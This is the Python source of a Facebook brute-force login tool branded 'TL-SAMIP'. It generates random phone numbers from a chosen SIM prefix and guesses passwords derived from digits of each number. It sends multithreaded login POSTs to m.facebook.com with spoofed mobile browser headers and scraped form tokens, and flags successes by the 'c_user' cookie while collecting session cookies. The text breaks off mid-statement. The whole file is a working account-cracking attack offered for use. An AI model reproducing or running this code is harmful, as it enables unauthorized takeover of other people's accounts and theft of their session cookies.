import requests,bs4,json,os,sys,random,datetime,time,re
import string
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
ugen=[]
loop = 0
oks = []
cps = []

#python en.py
ses = requests.Session()
session = requests.Session()
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
p = '\x1b[0;34m' # BIRU + 
#----------machin--------#
def clear():
	os.system('clear')
logo=(f""" {C}
 ######   ##                 ####      ##     ##   ##   ####    #####     ####   
   ##     ##                ##  ##    ####    ### ###    ##     ##  ##   ##  ##  
   ##     ##                ##       ##  ##   #######    ##     ##  ##   ## ###  
   ##     ##       ######    ####    ######   ## # ##    ##     #####    ## ###  
   ##     ##                    ##   ##  ##   ##   ##    ##     ##       ##      
   ##     ##                ##  ##   ##  ##   ##   ##    ##     ##       ##   #  
   ##     ######             ####    ##  ##   ##   ##   ####    ##        ####   
                                                                        
{B}----------------------------------------{B}
[{C}+{B}] WONER : TL- SAMIP
[{C}+{B}] FACEBOOK : OFFICIAL HACKER 
[{C}+{B}] WHATSAPP : 9815156629
[{C}+{B}] TOOL : RANDOM 
[{C}+{B}] VERSION : 1.0.0""")

def main():
	clear()
	print(logo)
	print(42*'-')
	print(f'[{C}1{B}] RANDOM CLONE')
	print(f'[{C}2{B}] EXIT')
	option = input(f'CHOICE :{C} ')
	if option =='1':SMP()
	
def SMP():
	user=[]
	os.system('clear')
	print(logo)
	print (f'EXAMPLE : 981')
	code = input(f'choice : ')
	print(f'EXAMPLE : [2000] [3000] [5000] [1000]')
	limit = int(input('choice : '))
	os.system('clear')
	print(logo)
	for nmbr in range(limit):
		nmp=''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as XSV:
		tl=str(len(user))
		print (42*'-')
		print(f'[{C}+{B}] TOTAL ACCOUNT : '+tl)
		print(f'[{C}+{B}] YOUR SIM CODE : '+code)
		print(f'[{C}+{B}] RUNNING PLEASE : WAIT ')
		print (42*'-')
		for psx in user:
			ids=code+psx
			passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:]]
			XSV.submit(method_crack,ids,passlist,tl)
            
            
def method_crack(ids,passlist,tl):
    global loop,oks,cps
    try:
        for ps in passlist:
            pro = random.choice(ugen)
            print(ids)
            #nip=random.choice(prox)
            sys.stdout.write(f'\r\r[{C}CRACKING{B}] [{C}%s{B}] [{C}%s{B}][OK:{C}%s{B}]\r'%(loop,tl,len(oks))) 
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com/').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.600000023841858',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfeyZ9SKK_nPj3o1fCktTSTlDcUcBVr2oMD-zsARm2FHbCy6_pztG3yOydTCc-LNULynGmGct5WBiuevHEZkIuhJWkkhpMrT6eMd3ROgxHFLnw&smuh=17697&lh=Ac-ZphqTpa-3mShBwmw&wtsid=rdr_0Q8KhNHqjhUoCT7ta&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Redmi Y3"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r{B}[{
